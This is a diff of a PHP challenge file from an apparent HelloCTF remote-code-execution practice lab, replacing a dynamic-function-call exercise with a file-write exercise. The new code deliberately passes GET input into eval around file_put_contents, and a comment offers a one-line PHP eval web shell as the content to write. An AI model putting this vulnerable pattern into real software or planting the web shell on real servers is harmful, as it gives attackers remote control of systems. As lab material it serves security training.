@@ -7,15 +7,21 @@
 # @email:  admin@hello-ctf.com
 # @link:   hello-ctf.com
 
---- HelloCTF - RCE靶场 : HP 特性 - 动态调用 --- 
+--- HelloCTF - RCE靶场 : 文件写入导致的RCE --- 
 
-PHP 支持在运行时动态构建并且调用函数，在下面的代码中 a可以被作为函数，b可以被作为函数的参数。
+https://www.php.net/manual/zh/function.file-put-contents.php
 
-try ?a=system&b=ls
+参考可以写入的内容：
+<?php @eval($_POST['a']); ?>
 
 */
 
-isset($_GET['a'])&&isset($_GET['b']) ? $_GET['a']($_GET['b']) : null;
+function helloctf($code){
+    $code = "file_put_contents(".$code.");";
+    eval($code);
+}
+
+isset($_GET['c']) ? helloctf($_GET['c']) : '';
 
 highlight_file(__FILE__);
 
